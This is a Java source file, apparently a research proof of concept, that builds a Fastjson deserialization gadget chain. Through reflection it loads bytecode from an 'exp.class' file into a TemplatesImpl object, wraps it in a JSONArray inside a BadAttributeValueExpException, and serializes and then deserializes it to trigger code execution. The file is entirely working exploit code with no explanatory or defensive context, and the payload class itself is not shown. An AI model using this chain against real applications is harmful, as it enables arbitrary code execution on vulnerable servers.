import com.alibaba.fastjson.JSONArray;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import static util.Util.*;



/**
 * @Description
 * @Author dragonkeep
 * @Date 2025/1/11
 */
public class Fastjson_Template {
    public static void main(String[] args) throws Exception{
        TemplatesImpl templates=new TemplatesImpl();
        Class templatesClass=templates.getClass();
        Field namefield=templatesClass.getDeclaredField("_name");
        namefield.setAccessible(true);
        namefield.set(templates,"dragonkeep");
        Field bytecodefield=templatesClass.getDeclaredField("_bytecodes");
        bytecodefield.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("exp.class"));
        byte[][] codes={code};
        bytecodefield.set(templates,codes);
        Field tfactoryField=templatesClass.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(templates,new TransformerFactoryImpl());

        JSONArray jsonArray= new JSONArray();
        jsonArray.add(templates);
        BadAttributeValueExpException badAttributeValueExpException=new BadAttributeValueExpException("dragonkeep");
        Field field=BadAttributeValueExpException.class.getDeclaredField("val");
        field.setAccessible(true);
        field.set(badAttributeValueExpException,jsonArray);
        serialize(badAttributeValueExpException);
        unserialize();
    }
}
